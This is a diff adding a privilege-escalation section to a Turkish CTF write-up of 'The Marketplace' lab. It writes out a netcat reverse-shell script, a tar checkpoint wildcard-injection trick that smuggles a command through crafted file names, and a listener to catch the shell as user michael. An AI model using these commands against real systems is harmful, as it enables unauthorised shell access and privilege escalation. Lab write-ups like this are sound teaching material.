@@ -240,8 +240,31 @@ Yetki yükseltme saldırısı yapmak için ilk başta sudo bitlerine bakıyorum.
 
 ```
 sudo -l
+```
+![sudo](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/sudo%20priv.png)
+
+
+Michael yetkileriyle çalışan bir sh dosyası var.Eğer bu dosyayı sömürebilirsek michael adına shell alabiliriz.
+
+![backup](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/backup_ls.png)
 
 ```
+cat > /opt/backups/shell.sh << EOF
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc (kendi ip adresini yaz) 4444 >/tmp/f
+EOF
+```
 
+```
+jake@the-marketplace:~$ chmod +x /opt/backups/shell.sh
+jake@the-marketplace:~$ touch "/opt/backups/--checkpoint=1"
+jake@the-marketplace:~$ touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"
+jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh
+```
+Çalıştırmadan önce kendi terminalinizde nc listener açın : 
 
+```
+melami㉿Melami> nc -lvnp 4444
+```
+![nc](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/micheal%20shell.png)
 
